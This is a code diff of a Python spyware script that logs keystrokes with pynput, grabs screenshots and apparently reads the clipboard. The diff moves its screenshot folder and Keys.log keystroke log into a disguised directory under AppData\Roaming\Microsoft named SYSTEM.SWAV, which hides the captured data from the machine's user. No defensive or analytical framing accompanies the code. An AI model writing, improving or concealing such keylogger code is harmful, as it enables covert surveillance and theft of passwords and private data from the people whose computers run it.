@@ -7,6 +7,10 @@ from pynput import keyboard
 import win32clipboard
 
 
+Directory = 'C:\\Users\\' + \
+    os.getlogin() + '\\AppData\\Roaming\\Microsoft\\SYSTEM.SWAV\\'
+
+
 # capture class will create screenshots
 
 
@@ -14,13 +18,13 @@ class capture():
     n = 0
 
     try:
-        os.makedirs("C:\\SYSTEM.SWAV\\Am0ASk2", exist_ok=True)
+        os.makedirs(Directory + 'Am0ASk2', exist_ok=True)
     except OSError:
         pass
 
     def capture():
         savePath = '{0}{1}{2}'.format(
-            'C:\\SYSTEM.SWAV\\Am0ASk2\\screenshot', capture.n, '.jpg')
+            Directory + 'Am0ASk2\\screenshot', capture.n, '.jpg')
         # grabs screenshots
         screenshot = ImageGrab.grab()
         screenshot.save(savePath)
@@ -29,15 +33,16 @@ class capture():
             print('Expected')
             capture.n += 1
             savePath = '{0}{1}{2}'.format(
-                'C:\\SYSTEM.SWAV\\Am0ASk2\\screanshot', capture.n, '.jpg')
+                Directory + 'Am0ASk2\\screanshot', capture.n, '.jpg')
             screenshot = ImageGrab.grab()
             screenshot.save(savePath)
             os.remove(savePath)
 
 
 def logger():
-    logDir = "C:\\SYSTEM.SWAV"
-    logging.basicConfig(filename=(os.path.join(logDir, "Keys.log")), filemode="w", format='%(asctime)s:%(message)s',
+    logDir = os.path.join(Directory, "Keys.log")
+
+    logging.basicConfig(filename=(logDir), filemode="w", format='%(asctime)s:%(message)s',
                         level=logging.DEBUG)
 
     def ctrl_V():
